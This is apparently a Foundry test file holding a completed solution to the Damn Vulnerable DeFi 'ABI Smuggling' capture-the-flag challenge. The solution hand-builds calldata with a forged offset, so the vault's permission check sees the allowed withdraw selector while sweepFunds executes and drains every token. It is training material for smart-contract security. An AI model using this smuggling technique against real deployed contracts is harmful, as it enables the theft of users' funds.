// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        
        uint256 balanceBefore = token.balanceOf(recovery);

        // 1. Execute selector
        bytes4 executeSelector = vault.execute.selector;

        // 2. Target address (padded to 32 bytes)
        bytes memory target = abi.encodePacked(
            bytes12(0),
            address(vault)
        );

        // 3. Manipulated dynamic offset
        bytes memory dataOffset = abi.encodePacked(
            uint256(0x80)
        );

        // 4. Dummy 32-byte word
        bytes memory emptyData = abi.encodePacked(
            uint256(0)
        );

        // 5. Fake permitted selector: withdraw
        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12),
            bytes28(0)
        );

        // 6. Actual malicious calldata
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            address(token)
        );

        // 7. Actual actionData length
        bytes memory actionDataLength = abi.encodePacked(
            uint256(sweepFundsCalldata.length)
        );

        // 8. Construct complete outer calldata
        bytes memory calldataPayload = abi.encodePacked(
            executeSelector,
            target,
            dataOffset,
            emptyData,
            withdrawSelectorPadded,
            actionDataLength,
            sweepFundsCalldata
        );

        // 9. Execute manually constructed calldata
        (bool success, ) = address(vault).call(
            calldataPayload
        );

        require(success, "Exploit failed");

        uint256 balanceAfter = token.balanceOf(recovery);

        console.log("Balance Before:", balanceBefore / 1 ether);
        console.log("Balance After:", balanceAfter / 1 ether);
    }

    function test_normalPlayerWithdraw() public {
        vm.startPrank(player);
        uint256 startingTime = block.timestamp;
        uint256 balanceBefore = token.balanceOf(recovery);
        bytes memory data =
            abi.encodeWithSignature("withdraw(address,address,uint256)", address(token), recovery, 1 ether);
        vm.warp(startingTime + 16 days);
        vault.execute(address(vault), data);
        uint256 balanceAfter = token.balanceOf(recovery);
        console.log("Balance Before In Recovery:    ", balanceBefore);
        console.log("Balance After In Recovery:     ", balanceAfter);
        console.log("withdraw Successfull as player!!!");
        vm.stopPrank();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

